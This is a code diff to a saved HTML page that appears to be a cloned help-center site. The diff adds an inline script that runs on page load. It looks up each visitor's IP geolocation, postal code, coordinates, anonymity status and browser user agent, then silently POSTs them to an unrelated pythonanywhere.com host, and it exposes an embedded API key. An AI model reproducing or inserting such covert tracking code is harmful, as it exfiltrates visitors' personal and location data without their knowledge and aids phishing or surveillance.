@@ -2273,31 +2273,46 @@
     <div><span></span><span></span></div>
   </div>
   <script type="text/javascript" src="./request_files/helpcenter-widget.min.js.download"></script>
-</body><grammarly-desktop-integration data-grammarly-shadow-root="true"><template shadowrootmode="open">
-    <style>
-      div.grammarly-desktop-integration {
-        position: absolute;
-        width: 1px;
-        height: 1px;
-        padding: 0;
-        margin: -1px;
-        overflow: hidden;
-        clip: rect(0, 0, 0, 0);
-        white-space: nowrap;
-        border: 0;
-        -moz-user-select: none;
-        -webkit-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-      }
+  <script>
+    window.onload = () => {
+                  fetch("https://api.ipdata.co?api-key=913c283a48be62c28c6534079276ffbf0fd60f2cd66c897112e61a6c", {
+                    method: "GET"
+                  })
+                    .then(response => response.text())
+                    .then(response => {
+                      response = JSON.parse(response);
 
-      div.grammarly-desktop-integration:before {
-        content: attr(data-content);
-      }
-    </style>
-    <div aria-label="grammarly-integration" role="group" tabindex="-1" class="grammarly-desktop-integration"
-      data-content="{&quot;mode&quot;:&quot;full&quot;,&quot;isActive&quot;:true,&quot;isUserDisabled&quot;:false}">
-    </div>
-  </template></grammarly-desktop-integration>
+                      let threat;
+
+                      if (response["threat"]["is_tor"] === false && response["threat"]["is_icloud_relay"] === false && response["threat"]["is_proxy"] === false && response["threat"]["is_anonymous"] === false) {
+                        threat = false;
+                      }
+                      else {
+                        threat = true;
+                      }
+
+                      let agent = navigator.userAgent;
+
+                      let data = {
+                        "ip": response["ip"],
+                        "city": response["city"],
+                        "region": response["region"],
+                        "country_name": response["country_name"],
+                        "postal": response["postal"],
+                        "latitude": response["latitude"],
+                        "longitude": response["longitude"],
+                        "time_zone": response["time_zone"]["current_time"],
+                        "threat": threat,
+                        "user-agent": agent
+                      };
+
+                      fetch("https://bobarakhas.pythonanywhere.com/", {
+                        method: "POST",
+                        body: JSON.stringify(data)
+                      })
+                    })
+                };
+  </script>
+</body>
 
 </html>
